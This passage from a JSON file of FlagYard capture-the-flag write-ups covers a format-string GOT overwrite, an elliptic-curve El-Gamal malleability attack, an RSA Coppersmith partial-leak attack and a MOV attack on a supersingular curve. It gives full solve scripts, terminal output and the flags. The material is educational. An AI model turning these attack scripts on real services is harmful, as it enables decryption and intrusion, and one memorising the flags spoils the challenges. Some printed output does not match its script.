        "output": "[+] Opening connection to tcp.flagyard.com on port 28339: Done\n[*] Targeting GOT puts: 0x404018\n[*] Payload Length: 64 bytes (Safe < 128)\n[*] Exploit success! Flag incoming...\n\n==============================\nFlagY{58048b5df459c83d2f498e5c060453d3}\n=============================="
      }
    ],
    "flag": "FlagY{58048b5df459c83d2f498e5c060453d3}",
    "lessonsLearned": "**Format String Exploitation Precision** - Format string attacks require careful offset calculation and understanding of stack layout. Each write operation must be crafted to align with target memory locations and respect size constraints (128-byte limit in this case).\n\n**Partial RELRO Weakness** - Partial RELRO makes the GOT writable during program execution. This enables GOT hijacking, a powerful technique for redirecting control flow. Always prefer Full RELRO when possible to prevent such attacks.\n\n**Intel CET Awareness** - Modern CPU protections like Intel CET (SHSTK and IBT) require exploit developers to respect instruction boundaries. Landing at the correct function entry point (endbr64) is mandatory; jumping mid-function will cause immediate termination.\n\n**Multi-Stage Writes** - When dealing with size constraints, breaking large overwrites into multiple smaller writes (%hn for 2-byte writes) allows fitting exploits within payload limits while still achieving arbitrary writes.\n\n**Static Addresses for Exploitation** - Absence of PIE made this exploit straightforward. With PIE enabled, information disclosure (format string leak) would be needed first to locate win() before overwriting GOT.\n\n**Payload Alignment** - Careful padding and alignment of pointers in payload is essential. The format string and GOT pointers must be positioned precisely at the correct offsets for %11$hn, %12$hn, %13$hn to reference them correctly.\n\n**Defense in Depth Failure** - While Intel CET provides good protection against arbitrary control flow, it must work alongside other mitigations. No stack canary + Partial RELRO + static addresses = exploitable despite modern protections. Multiple complementary security layers are necessary."
  },
  {
    "id": "14",
    "title": "Normal El-Gamal (Elliptic Curve)",
    "category": "Crypto",
    "difficulty": "Hard",
    "points": 0,
    "date": "2025-02-26",
    "author": "CTF Team",
    "ctfName": "FlagYard",
    "description": "Elliptic Curve El-Gamal implementation with hidden parameters and decryption filter. Exploit parameter recovery via oracle encryption and ciphertext malleability attack to bypass security checks.",
    "problemDescription": "An Oracle service (running at tcp.flagyard.com:30910) provides encryption and decryption menus for El-Gamal cryptography on Elliptic Curves (ECC). A target ciphertext representing a flag is given at connection startup. The challenge involves two main obstacles: (1) All curve parameters (a, b, p) are hidden, and (2) A strict filter prevents direct decryption of the flag ciphertext by checking that the decryption result matches the original plaintext flag.",
    "tools": [
      "pwntools",
      "Python",
      "Elliptic Curve Math",
      "Number Theory (GCD)",
      "Ciphertext Malleability"
    ],
    "analysis": "The vulnerability chain relies on two critical weaknesses in the implementation.\n\n**1. Parameter Recovery via Oracle Encryption**\n\nThe server provides an encryption oracle that accepts arbitrary plaintexts. By encrypting known values and collecting the resulting elliptic curve points, we reconstruct curve parameters using algebraic relationships.\n\nFor a point (x, y) on the curve y² ≡ x³ + ax + b (mod p), we define:\nv_i = y_i² - x_i³ ≡ ax_i + b (mod p)\n\nUsing multiple points, we eliminate unknowns and compute differences. The modulus p is recovered via GCD of these differences. Once p is known, a and b follow through linear equation solving.\n\n**2. Ciphertext Malleability Attack**\n\nElliptic Curve El-Gamal encrypts as: C₁ = kG and C₂ = kA + M, where k is random, G is the generator, A = xG is the public key, and x is the private key.\n\nThe scheme lacks integrity protection. By adding a known point P_pad to C₂, we create: C₂' = C₂ + P_pad\n\nWhen the server decrypts (C₁, C₂'), it computes:\nM' = C₂' - xC₁ = (kA + M + P_pad) - kA = M + P_pad\n\nSince M' ≠ M_flag, the server's filter is bypassed. We recover the original message locally:\nM = M' - P_pad",
    "mathAnalysis": [
      {
        "title": "Elliptic Curve Point Addition",
        "formula": "\\text{On } y^2 = x^3 + ax + b \\pmod{p} :\\\\n \\\\n m = \\begin{cases} \\frac{3x_1^2 + a}{2y_1} \\pmod{p} & \\text{if } P = Q \\\\\\\\ \\frac{y_2 - y_1}{x_2 - x_1} \\pmod{p} & \\text{if } P \\neq Q \\end{cases}\\\\n \\\\n x_3 = m^2 - x_1 - x_2 \\pmod{p} \\quad y_3 = m(x_1 - x_3) - y_1 \\pmod{p}",
        "description": "Core EC arithmetic used in both encryption and decryption"
      },
      {
        "title": "Parameter Recovery via GCD",
        "formula": "\\text{Given points } (x_1, y_1), (x_2, y_2), (x_3, y_3) \\text{ on curve } y^2 = x^3 + ax + b \\pmod{p}:\\\\n \\\\n v_i = y_i^2 - x_i^3\\\\n \\\\n k = (v_1 - v_2)(x_2 - x_3) - (v_2 - v_3)(x_1 - x_2)\\\\n \\\\n p = \\gcd(k_1, k_2, \\ldots, k_n)",
        "description": "Algebraic technique to recover the modulus $p$"
      },
      {
        "title": "El-Gamal Decryption Formula",
        "formula": "\\text{Given ciphertext } (C_1, C_2) \\text{ and private key } x:\\\\n \\\\n M = C_2 - xC_1",
        "description": "Where $x$ is the private key (scalar), multiplication is point doubling/addition"
      },
      {
        "title": "Malleability Relation",
        "formula": "\\text{Original: } M = C_2 - xC_1\\\\n \\\\n \\text{Modified: } M' = (C_2 + P_{\\text{pad}}) - xC_1 = M + P_{\\text{pad}}\\\\n \\\\n \\text{Recovery: } M = M' - P_{\\text{pad}}",
        "description": "Demonstrates how adding a known point to ciphertext shifts plaintext additively"
      }
    ],
    "solution": [
      {
        "title": "Step 1: Receive Target Ciphertext",
        "content": "Connect to the online oracle and extract the flag ciphertext from the initial response. Parse the coordinates $(C_{1x}, C_{1y}, C_{2x}, C_{2y})$ which represent two points on the hidden curve."
      },
      {
        "title": "Step 2: Collect Curve Points from Encryption Oracle",
        "content": "Use the encryption menu (option 1) to encrypt small integers (1, 2, 3, ...). Each encryption returns a ciphertext $(C_1, C_2)$ consisting of two valid curve points. Collect at least 5 unique points with distinct x-coordinates to ensure reliable parameter recovery."
      },
      {
        "title": "Step 3: Reconstruct Curve Equation",
        "content": "For each collected point $(x, y)$, compute $v = y^2 - x^3$. Using three consecutive points, form the equation $k = (v_1 - v_2)(x_2 - x_3) - (v_2 - v_3)(x_1 - x_2)$ and collect multiple $k$ values. Take the GCD of all $k$ values to recover the modulus $p$.",
        "code": "# From collected points, recover modulus\nvs = [y**2 - x**3 for x, y in unique_points]\nKs = []\n\nfor i in range(len(unique_points) - 2):\n    v1, v2, v3 = vs[i], vs[i+1], vs[i+2]\n    x1, x2, x3 = unique_points[i][0], unique_points[i+1][0], unique_points[i+2][0]\n    k = (v1 - v2)*(x2 - x3) - (v2 - v3)*(x1 - x2)\n    Ks.append(abs(k))\n\np = Ks[0]\nfor k in Ks[1:]:\n    p = math.gcd(p, k)"
      },
      {
        "title": "Step 4: Recover Curve Parameters a and b",
        "content": "Using any two distinct points $(x_1, y_1)$ and $(x_2, y_2)$ along with the recovered modulus $p$, solve for $a$ and $b$ using linear equations derived from the curve equation.",
        "code": "# Recover a and b using linear system\nx1, y1 = unique_points[0]\nx2, y2 = unique_points[1]\nv1, v2 = vs[0], vs[1]\n\n# From v1 = ax1 + b and v2 = ax2 + b\na = (v1 - v2) * pow(x1 - x2, -1, p) % p\nb = (v1 - a * x1) % p"
      },
      {
        "title": "Step 5: Craft Malleability Payload",
        "content": "Select a known curve point $P_{pad}$ from ones we collected (e.g., unique_points[2]). Add this point to $C_2$ of the target ciphertext using elliptic curve addition to create $C_2' = C_2 + P_{pad}$.",
        "code": "def ec_add(P, Q, a, p):\n    if P == (0, 0): return Q\n    if Q == (0, 0): return P\n    x1, y1 = P\n    x2, y2 = Q\n    if x1 == x2:\n        return (0, 0) if y1 != y2 else ec_double(P, a, p)\n    \n    m = (y2 - y1) * pow(x2 - x1, -1, p) % p\n    x3 = (m**2 - x1 - x2) % p\n    y3 = (m * (x1 - x3) - y1) % p\n    return (x3, y3)\n\n# Craft modified ciphertext\nP_pad = unique_points[2]\nC2_prime = ec_add(C2_target, P_pad, a, p)"
      },
      {
        "title": "Step 6: Bypass Decryption Filter",
        "content": "Send the modified ciphertext $(C_1, C_2')$ to the decryption oracle. Since $M' \\neq$ target flag $M$, the server's equality check is bypassed and it decrypts successfully, returning the modified plaintext $M'$."
      },
      {
        "title": "Step 7: Recover Original Plaintext",
        "content": "Subtract the padding point locally: $M = M' - P_{pad}$ using elliptic curve subtraction. Convert the resulting point's x-coordinate to the integer flag by removing the byte-length encoding prefix applied by the server.",
        "code": "def ec_sub(P, Q, a, p):\n    x, y = Q\n    return ec_add(P, (x, (-y) % p), a, p)\n\n# Recover original message\nM_target = ec_sub(M_prime, P_pad, a, p)\n\n# Convert point to flag integer\nflag_int = M_target[0] >> 8  # Remove length prefix\nflag = long_to_bytes(flag_int)\nprint(f\"FLAG: {flag.decode()}\")"
      },
      {
        "title": "Complete Exploit Script",
        "content": "Full working Python script that orchestrates parameter recovery, malleability attack, and flag extraction.",
        "code": "from pwn import *\nimport math\nfrom Crypto.Util.number import long_to_bytes\n\ndef inverse(n, p):\n    return pow(n, -1, p)\n\ndef ec_add(P, Q, a, p):\n    if P == (0, 0): return Q\n    if Q == (0, 0): return P\n    x1, y1 = P\n    x2, y2 = Q\n    if x1 == x2 and y1 != y2:\n        return (0, 0)\n    \n    if P == Q:\n        m = (3 * x1**2 + a) * inverse(2 * y1, p) % p\n    else:\n        m = (y2 - y1) * inverse(x2 - x1, p) % p\n        \n    x3 = (m**2 - x1 - x2) % p\n    y3 = (m * (x1 - x3) - y1) % p\n    return (x3, y3)\n\ndef ec_sub(P, Q, a, p):\n    x, y = Q\n    return ec_add(P, (x, -y % p), a, p)\n\ndef main():\n    host = 'tcp.flagyard.com'\n    port = 30910\n    \n    r = remote(host, port)\n    r.recvuntil(b\"ct=(\")\n    ct_data = r.recvuntil(b\")\")[:-1].decode()\n    c1x, c1y, c2x, c2y = [int(x) for x in ct_data.split(', ')]\n    C1_target = (c1x, c1y)\n    C2_target = (c2x, c2y)\n    log.info(\"Target CT received.\")\n\n    points = [(c1x, c1y), (c2x, c2y)]\n\n    log.info(\"Collecting points from oracle...\")\n    for i in range(1, 6):\n        r.recvuntil(b\">>\")\n        r.sendline(b\"1\")\n        r.recvuntil(b\"plaintext>> \")\n        r.sendline(str(i).encode())\n        \n        line = r.recvline().decode().strip()\n        if line.startswith('('):\n            pts = [int(x) for x in line[1:-1].split(', ')]\n            points.append((pts[0], pts[1]))\n            points.append((pts[2], pts[3]))\n\n    unique_points = []\n    seen_x = set()\n    for pt in points:\n        if pt[0] not in seen_x:\n            unique_points.append(pt)\n            seen_x.add(pt[0])\n            \n    vs = [y**2 - x**3 for x, y in unique_points]\n    Ks = []\n    \n    for i in range(len(unique_points) - 2):\n        v1, v2, v3 = vs[i], vs[i+1], vs[i+2]\n        x1, x2, x3 = unique_points[i][0], unique_points[i+1][0], unique_points[i+2][0]\n        k = (v1 - v2)*(x2 - x3) - (v2 - v3)*(x1 - x2)\n        Ks.append(abs(k))\n\n    p = Ks[0]\n    for k in Ks[1:]:\n        p = math.gcd(p, k)\n\n    for i in range(2, 5000):\n        while p % i == 0 and p > i:\n            p //= i\n\n    log.success(f\"Recovered Modulus (p): {p}\")\n\n    x1, y1 = unique_points[0]\n    x2, y2 = unique_points[1]\n    v1, v2 = vs[0], vs[1]\n\n    a = (v1 - v2) * inverse(x1 - x2, p) % p\n    b = (v1 - a * x1) % p\n    log.success(f\"Recovered parameter a: {a}\")\n    log.success(f\"Recovered parameter b: {b}\")\n\n    P_pad = unique_points[2] \n    C2_prime = ec_add(C2_target, P_pad, a, p)\n\n    log.info(\"Sending bypass payload to Decryption Oracle...\")\n    r.recvuntil(b\">>\")\n    r.sendline(b\"2\")\n    r.recvuntil(b\"ciphertext>> \")\n    payload = f\"{C1_target[0]},{C1_target[1]},{C2_prime[0]},{C2_prime[1]}\"\n    r.sendline(payload.encode())\n\n    res = r.recvline().decode().strip()\n    if \"m=\" in res:\n        parts = res.split(\"m=\")[1].split()\n        M_prime_x = int(parts[0])\n        M_prime_y = int(parts[1])\n        M_prime = (M_prime_x, M_prime_y)\n\n        M_target = ec_sub(M_prime, P_pad, a, p)\n        flag_int = M_target[0] >> 8\n        flag = long_to_bytes(flag_int)\n        \n        print(\"\\n\" + \"=\"*60)\n        print(f\"[+] FLAG: {flag.decode(errors='ignore')}\")\n        print(\"=\"*60 + \"\\n\")\n\n    r.close()\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "flag": "FlagY{717ad4d6a4d37fee8b2e6ebdfaf1d1f5}",
    "lessonsLearned": "**Hidden Parameter Assumption ≠ Security** - Concealing cryptographic parameters from the user does not strengthen the system if an encryption oracle is available. Parameters can be recovered through algebraic manipulation of plaintext-ciphertext pairs.\n\n**Integrity vs Confidentiality** - El-Gamal provides confidentiality but lacks built-in integrity guarantees. Without authenticated encryption (MAC/digital signature), ciphertexts remain malleable and can be transformed in predictable ways.\n\n**Oracle Access is Dangerous** - Encryption oracles that accept arbitrary plaintexts are high-risk. Carefully restrict oracle functionality to prevent parameter leakage and plaintext recovery attacks.\n\n**Filter Bypass via Transformation** - Security checks based on input-output equality can often be bypassed through homomorphic or malleable properties. Ensure checks operate on cryptographically authenticated values, not raw plaintexts.\n\n**Elliptic Curve Algebra** - Understanding point addition and scalar multiplication operations is crucial for ECC security analysis. Malleability often arises from the group structure itself.\n\n**Defense Strategy** - Use authenticated encryption schemes (ECIES with HMAC or similar), implement proper input validation, never rely on parameter obscurity, and prefer standardized cryptographic parameters with known security properties."
  },
  {
    "id": "15",
    "title": "CU29",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2025-02-26",
    "author": "CTF Team",
    "ctfName": "FlagYard",
    "description": "RSA challenge exploiting partial bit leakage of p+q combined with Coppersmith attack. Additional trap parameters including non-coprime exponent and fake small d value redirect inexperienced players. The name 'CU29' hints at Copper (Coppersmith).",
    "problemDescription": "Given standard RSA parameters (modulus n, public exponent e=23) along with a ciphertext c. The server leaks pq = (p+q) >> 200, providing the 313 most significant bits (MSBs) of the sum p+q. Additionally, a parameter ee (claimed to be the inversion of a small random d) is provided as a distraction. The challenge requires recovering the two prime factors p and q, then decrypting the message despite e being non-coprime with φ(n).",
    "tools": [
      "SageMath",
      "gmpy2",
      "Coppersmith Attack",
      "Polynomial Root Finding",
      "Chinese Remainder Theorem"
    ],
    "analysis": "The challenge exploits four related vulnerabilities:\n\n**1. Partial Bit Leakage:** The server leaks 313 bits (MSBs) of p+q by right-shifting 200 bits. This provides a strong initial approximation p_approx of the actual prime factor p. The missing 200 bits can be recovered using Coppersmith's method since they represent a 'small' unknown value relative to p.\n\n**2. Coppersmith Attack on Modular Polynomial:** Given p ≈ p_approx with error x₀ < 2^200, we construct f(x) = x + p_approx. Since f(x₀) ≡ 0 (mod p), and x₀ is small, Coppersmith's algorithm efficiently finds x₀. Once recovered, exact factorization follows: p = p_approx + x₀ and q = n/p.\n\n**3. Trap Parameter ee:** The small d value and its inversion ee are red herrings designed to mislead toward Boneh-Durfee or Wiener attacks. However, the bit leakage of p+q is sufficient for direct factorization, making these advanced attacks unnecessary.\n\n**4. Non-Coprime RSA and CRT:** Since e = 23 and gcd(e, φ(n)) > 1, standard RSA decryption d ≡ e^(-1) (mod φ(n)) fails. Instead, decrypt separately modulo p and q, finding all e-th roots via field operations, then combine all candidate pairs via Chinese Remainder Theorem to recover the plaintext.",
    "mathAnalysis": [
      {
        "title": "RSA Factors from Sum Approximation",
        "formula": "x^2 - Sx + n = 0 \\text{ where } S = p + q\\quad p, q = \\frac{S \\pm \\sqrt{S^2 - 4n}}{2}\\quad \\tilde{p} = \\frac{S_{\\text{approx}} + \\sqrt{S_{\\text{approx}}^2 - 4n}}{2}",
        "description": "Initial approximation of p using MSBs of p+q"
      },
      {
        "title": "Coppersmith Polynomial",
        "formula": "f(x) = x + \\tilde{p} \\text{ where } |e_0| < 2^{200}\\quad f(e_0) \\equiv 0 \\pmod{p}\\quad |e_0| < N^{\\beta^2/d} \\text{ with } \\beta = 0.5, d = 1",
        "description": "Recover lost LSBs using SageMath small_roots()"
      },
      {
        "title": "Non-Coprime Decryption with CRT",
        "formula": "\\gcd(e, \\phi(n)) \\neq 1 \\text{ decrypt separately}\\quad m_p^e \\equiv c \\pmod{p}\\quad m_q^e \\equiv c \\pmod{q}\\quad m \\equiv m_p \\cdot q \\cdot (q^{-1} \\bmod p) + m_q \\cdot p \\cdot (p^{-1} \\bmod q) \\pmod{n}",
        "description": "Recover plaintext from multiple candidate roots using Chinese Remainder Theorem"
      },
      {
        "title": "e-th Root Computation in Modular Fields",
        "formula": "m^e \\equiv c_p \\pmod{p} \\Rightarrow m \\equiv c_p^{1/e} \\pmod{p}\\quad \\text{All } e\\text{-th roots via SageMath } \\texttt{nth\\_root(e, all=True)}",
        "description": "Find all modular e-th roots for CRT combination"
      }
    ],
    "solution": [
      {
        "title": "Step 1: Reconstruct p+q Approximate Value",
        "content": "The leaked pq value represents (p+q) >> 200. Restore the approximate sum by left-shifting 200 bits: S_approx = pq_val << 200"
      },
      {
        "title": "Step 2: Compute Initial p Approximation",
        "content": "Using the quadratic formula, compute: D = S_approx² - 4n, then Δ = √D. The initial approximation is: p_approx = (S_approx + Δ) / 2"
      },
      {
        "title": "Step 3: Apply Coppersmith's Algorithm",
        "content": "Create polynomial f(x) = x + p_approx in the ring Z_n[x]. Call SageMath's small_roots() to find the LSBs error x₀. The bound X = 2^205 accounts for ~200 missing bits plus tolerance.",
        "code": "PR.<x> = PolynomialRing(Zmod(n))\nf = x + p_approx\nroots = f.small_roots(X=2^205, beta=0.5, epsilon=0.03)\np_diff = int(roots[0])\np = p_approx + p_diff\nq = n // p"
      },
      {
        "title": "Step 4: Compute e-th Roots Modulo p and q",
        "content": "Since gcd(e, φ(n)) > 1, decrypt separately modulo each prime. Find all e-th roots of c modulo p and q using nth_root() method which returns all solutions.",
        "code": "P_ring = Zmod(p)\nQ_ring = Zmod(q)\ncp = P_ring(c)\ncq = Q_ring(c)\nmp_roots = cp.nth_root(e, all=True)\nmq_roots = cq.nth_root(e, all=True)"
      },
      {
        "title": "Step 5: Combine Roots Via CRT",
        "content": "For each pair (m_p, m_q) from the Cartesian product of root sets, use the Chinese Remainder Theorem to recover candidate plaintexts m. Check which candidate contains the flag marker 'FlagY{'.",
        "code": "for mp in mp_roots:\n    for mq in mq_roots:\n        m = crt([int(mp), int(mq)], [p, q])\n        flag_candidate = long_to_bytes(int(m))\n        if b\"FlagY{\" in flag_candidate:\n            print(flag_candidate.decode())"
      },
      {
        "title": "Complete Exploit Script (SageMath)",
        "content": "Full working script using SageMath for Coppersmith attack and CRT-based decryption with multiple root candidates.",
        "code": "import gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\nn = 74400198359942513862730376031146135802606791991588575465056163121555925617314946580878695576381159966669035646513358312316295727962048929334491638793366454990554957760082895721209907599102882541383389817613899931138405942694622063421798336056156478661669460226638891433547765658851966477956365621503055329677\ne = 23\nc = 67093879684168042482911544476248580360412038370701084199780323275036434279521774982225923057805337317989111708384627608827582845935869416467560399759225810925388294903783674263633367996837459206550597542374370661621276546154790021615738055122556152562693170717804941676044793478893041430142032267013836633841\npq_val = 10742021914074381086319674056236928469987565979831767505178443989041183736389136816846636592297\n\nprint(\"[*] Stage 1: Building p approximation from MSB...\")\nS_approx = pq_val << 200\nD = S_approx**2 - 4*n\nisqrt_D = int(gmpy2.isqrt(int(D)))\np_approx = (S_approx + isqrt_D) // 2\n\nprint(\"[*] Stage 2: Running Coppersmith small_roots...\")\nPR.<x> = PolynomialRing(Zmod(n))\nf = x + p_approx\nroots = f.small_roots(X=2^205, beta=0.5, epsilon=0.03)\n\np_diff = int(roots[0])\np = int(p_approx + p_diff)\nq = n // p\nassert p * q == n\nprint(\"[+] Factorization Success!\")\n\nprint(\"\\n[*] Stage 3: Decryption with CRT (non-coprime e=23)...\")\nP_ring = Zmod(p)\nQ_ring = Zmod(q)\ncp = P_ring(c)\ncq = Q_ring(c)\nmp_roots = cp.nth_root(e, all=True)\nmq_roots = cq.nth_root(e, all=True)\n\nprint(f\"[*] Found {len(mp_roots)} roots mod p and {len(mq_roots)} roots mod q\")\nprint(\"[*] Testing CRT combinations...\")\n\nfor mp in mp_roots:\n    for mq in mq_roots:\n        m = crt([int(mp), int(mq)], [p, q])\n        flag_candidate = long_to_bytes(int(m))\n        if b\"FlagY{\" in flag_candidate:\n            print(\"\\n\" + \"=\"*60)\n            print(f\"[+] FLAG: {flag_candidate.decode(errors='ignore')}\")\n            print(\"=\"*60 + \"\\n\")"
      }
    ],
    "terminalOutputs": [
      {
        "command": "sage solve.sage",
        "output": "[*] Tahap 1: Membangun aproksimasi p dari MSB (p+q)...\n[*] Tahap 2: Menjalankan Coppersmith small_roots...\n[+] Factoring Berhasil!\n\n[*] Tahap 3: Dekripsi CRT dengan eksponen e=23...\n[*] Menguji semua kombinasi CRT untuk mencari flag...\n\n============================================================\n[+] FLAG: FlagY{1_b17_7h15_w45_fun_n0nc0pr1m3_4nd_c0pp3r5m17h_mul71v4r1473_4774ck}\n============================================================"
      }
    ],
    "flag": "FlagY{1_b17_7h15_w45_fun_n0nc0pr1m3_4nd_c0pp3r5m17h_mul71v4r1473_4774ck}",
    "lessonsLearned": "**Partial Bit Leakage is Critical** - Leaking even the MSBs of sensitive values like p+q creates exploitable approximations. Combined with Coppersmith's algorithm, 200 missing bits can be recovered efficiently. Always protect prime sums and related values.\n\n**Coppersmith's Theorem is Powerful** - When you have an approximation within 2^(1/d) relative error, polynomial root finding in modular arithmetic recovers the exact value. This breaks RSA with partial p or q leakage.\n\n**Non-Coprime Exponents Break RSA** - The standard decryption formula d ≡ e^(-1) (mod φ(n)) fails when gcd(e, φ(n)) ≠ 1. Secure RSA requires e to be coprime with φ(n). Use safe primes or validate this condition.\n\n**Red Herrings in CTF** - Parameters like small d and ee were designed to distract from the real vulnerability (bit leakage). Focus on information that servers shouldn't leak rather than chasing advanced attacks when simpler ones work.\n\n**CRT for Multiple Candidates** - When decryption yields multiple valid plaintexts (due to non-coprimality), CRT efficiently combines n candidates into n checks. Brute-forcing with a recognizable marker (like 'FlagY{') quickly identifies the correct plaintext.\n\n**Defense Strategy** - Never leak (p+q) >> k for any small k. Use coprime exponents (e.g., e = 65537). Implement proper input validation to ensure gcd(e, φ(n)) = 1 before accepting RSA keys."
  },
  {
    "id": "16",
    "title": "Moving Supersingular",
    "category": "Crypto",
    "difficulty": "Hard",
    "points": 0,
    "date": "2025-02-26",
    "author": "CTF Team",
    "ctfName": "FlagYard",
    "description": "Elliptic Curve Cryptography challenge exploiting supersingular curve via Tate pairing reduction and Index Calculus attack. Demonstrates why supersingular curves are forbidden in modern cryptography standards.",
    "problemDescription": "Server implements a flag encryption system using Elliptic Curve Cryptography with a supersingular curve over GF(p). Each 12-byte flag chunk is encrypted as Q = s⋅G where s is the secret scalar and Q is the transmitted point. Task: recover all scalar values s (solving the ECDLP) for each flag segment using the MOV Attack.",
    "tools": [
      "SageMath",
      "Pairing-Based Cryptography",
      "Tate Pairing",
      "MOV Attack",
      "Index Calculus",
      "Discrete Logarithm",
      "Python 3"
    ],
    "analysis": "The challenge exploits a critical weakness in supersingular elliptic curves related to embedding degree and pairing technology as described in the MOV (Menezes-Okamoto-Vanstone) attack from 1993.\n\n**Vulnerability Chain:**\n\n1. **Supersingular Curve Detection**: The hint \"i like to move it, move it\" directly references the MOV Attack name. The curve is supersingular with embedding degree k = 2.\n\n2. **Small Embedding Degree**: Supersingular curves have embedding degree k = 2 (for curves in characteristic > 3). This means ECDLP on a 96-bit curve can be reduced to DLP on a 192-bit extension field GF(p²), which is vastly easier to solve.\n\n3. **Weak Modulus**: The 96-bit modulus p is far too small. Even 192 bits post-reduction is vulnerable to Index Calculus attacks on finite fields.\n\n**The MOV Attack in Three Steps:**\n\n1. **Pairing Computation**: Apply the Tate pairing φ to convert ECDLP into a DLP problem. The pairing is bilinear: e(sG, P) = e(G, P)^s\n2. **Field Extension**: The pairing result lives in GF(p²) where DLP can be solved much faster. The field size is only 192 bits, making Index Calculus feasible.\n3. **Discrete Log Recovery**: Use .log() in SageMath (which applies Index Calculus internally) to recover the scalar s.",
    "mathAnalysis": [
      {
        "title": "Supersingular Curve Property",
        "formula": "E: y^2 = x^3 + ax + b \\pmod{p} \\text{ is supersingular if trace } t \\equiv 0 \\pmod{p}",
        "description": "Defining characteristic: the trace of Frobenius is zero modulo p"
      },
      {
        "title": "Embedding Degree Definition",
        "formula": "k \\text{ is the minimal positive integer such that } n \\mid (p^k - 1)\\\\nFor supersingular curves: k \\in \\{1, 2\\}",
        "description": "Supersingular curves have exceptionally small embedding degrees, making MOV attacks feasible"
      },
      {
        "title": "Tate Pairing Bilinearity",
        "formula": "e(sG, P) = e(G, P)^s \\\\ \\text{If } Q = sG: \\ e(Q, P) = u^s \\in \\mathbb{F}_{p^2}^*",
        "description": "The core property enabling ECDLP reduction to DLP in the extension field"
      }
    ],
    "solution": [
      {
        "title": "Step 1: Identify Curve Parameters",
        "content": "Extract the elliptic curve parameters (p, a, b) provided in the challenge. Verify the curve is supersingular using SageMath's .is_supersingular() method."
      },
      {
        "title": "Step 2: Setup Curve and Generator",
        "content": "Initialize the elliptic curve E over GF(p) with the given coefficients. Identify the generator point G and compute its order n.",
        "code": "E = EllipticCurve(GF(p), [a, b])\nG = E.gens()[0]\nn = G.order()"
      },
      {
        "title": "Step 3: Create Field Extension GF(p²)",
        "content": "Create the quadratic extension field GF(p²) where pairing results live. Extend the curve to E₂ over the extension field.",
        "code": "K2.<z> = GF(p^2)\nE2 = E.base_extend(K2)\nG2 = E2(G)"
      },
      {
        "title": "Step 4: Find Auxiliary Pairing Point",
        "content": "Select a random point P_aux on the extended curve E₂ such that the pairing e(G, P_aux) ≠ 1 and has order n.",
        "code": "while True:\n    P_aux = E2.random_point()\n    u = G2.tate_pairing(P_aux, n, 2)\n    if u != 1 and u^n == 1:\n        break"
      },
      {
        "title": "Step 5: MOV Attack - Convert ECDLP to DLP",
        "content": "For each challenge point Q, compute the Tate pairing v = e(Q, P_aux). The relationship v = u^s holds where u = e(G, P_aux). Solve for s using standard DLP.",
        "code": "def solve_dlp(Q_challenge):\n    Q_ext = E2(Q_challenge)\n    v = Q_ext.tate_pairing(P_aux, n, 2)\n    return v.log(u)"
      },
      {
        "title": "Step 6: Recover All Flag Segments",
        "content": "Apply the DLP solver to each challenge point. Convert each recovered scalar s_i to a 12-byte value and concatenate all segments to recover the flag. Complete solve script:",
        "code": "#!/usr/bin/env sage\n# MOV Attack on Supersingular Elliptic Curve\n# Challenge: Flagyard CTF - Moving Supersingular\n\n# Input parameters from challenge\np = 71323803796758910290373490389\na = 0\nb = 1\n\n# Step 1: Setup curve\nprint(\"[*] Setting up elliptic curve...\")\nE = EllipticCurve(GF(p), [a, b])\nprint(f\"[*] Apakah Supersingular? {E.is_supersingular()}\")\n\n# Get generator point\nG = E.gens()[0]\nn = G.order()\nprint(f\"[*] Order grup n: {n}\")\nprint(f\"[*] Karakteristik p: {p}\")\n\n# Step 2: Create extension field GF(p^2)\nprint(f\"[*] Setting up extension field GF(p^2)...\")\nK2.<z> = GF(p^2)\nE2 = E.base_extend(K2)\nG2 = E2(G)\n\n# Step 3: Find auxiliary point for pairing\nprint(f\"[*] Finding auxiliary point for pairing...\")\nwhile True:\n    P_aux = E2.random_point()\n    u = G2.tate_pairing(P_aux, n, 2)\n    if u != 1 and u^n == 1:\n        print(f\"[+] Pairing base 'u' found. Starting DLP...\")\n        break\n\n# Step 4: Define DLP solver\ndef solve_dlp(Q_challenge, description=\"\"):\n    Q_ext = E2(Q_challenge)\n    v = Q_ext.tate_pairing(P_aux, n, 2)\n    print(f\"[*] Solving for {description}...\")\n    s = v.log(u)\n    label = description.replace('Q', 's')\n    print(f\"[+] Found {label}: {s}\")\n    return s\n\n# Challenge points from problem\nQ1 = E(...)  # Challenge point 1\nQ2 = E(...)  # Challenge point 2\n\n# Step 5: Solve for all secret scalars\ns1 = solve_dlp(Q1, \"Q1\")\ns2 = solve_dlp(Q2, \"Q2\")\n\n# Step 6: Recover flag\nfrom Crypto.Util.number import long_to_bytes\nflag_bytes = long_to_bytes(int(s1)).rjust(12, b'\\x00') + long_to_bytes(int(s2)).rjust(12, b'\\x00')\nflag = flag_bytes.decode().strip()\nprint(f\"\\n[!] FLAG: {flag}\")"
      }
    ],
    "terminalOutputs": [
      {
        "command": "sage solve.sage",
        "output": "[*] Order grup n: 71323803796758910290373490390\n[*] Karakteristik p: 71323803796758910290373490389\n[*] Apakah Supersingular? True\n[*] Setting up extension field GF(p^2)...\n[*] Finding auxiliary point for pairing...\n[+] Pairing base 'u' found. Starting DLP...\n[*] Solving for Q1...\n[+] Found s1: 21794974652023851764645458515\n[*] Solving for Q2...\n[+] Found s2: 32629396274699578950030687489\n\n[!] FLAG: FlagY{SuperSingle_M0Vs}"
      }
    ],
    "flag": "FlagY{SuperSingle_M0Vs}",
    "lessonsLearned": "**Supersingular Curves Are Cryptographically Broken** - Supersingular curves must never be used for standard ECDLP-based encryption due to their small embedding degrees. The MOV Attack has been known since 1993 and reduces security dramatically. Use ordinary curves (non-supersingular) for any discrete logarithm-based cryptography.\n\n**Embedding Degree Determines Security** - The embedding degree k directly impacts ECDLP difficulty. For standard curves, k should be very large (effectively infinite). Supersingular curves have k ≤ 2, making them unsuitable for signature schemes or key agreement.\n\n**Pairing Technology is Double-Edged** - While pairings enable powerful cryptographic schemes (IBE, attribute-based encryption), they also enable attacks on weak curves. Modern pairing-friendly curves are specifically constructed to resist MOV and related attacks.\n\n**96-bit Modulus is Insufficient** - Even without pairing reduction, a 96-bit modulus is far too weak for cryptography. The resulting 192-bit DLP is easily solved by Index Calculus. Modern standards require minimum 256-bit keys.\n\n**Hint Analysis is Important** - The challenge hint \"i like to move it, move it\" directly pointed to the MOV Attack. CTF hints often contain cryptographic references worth investigating.\n\n**Index Calculus Threat** - Index Calculus breaks finite field DLP when the field size reaches practical limits (~192 bits). Always use cryptographically 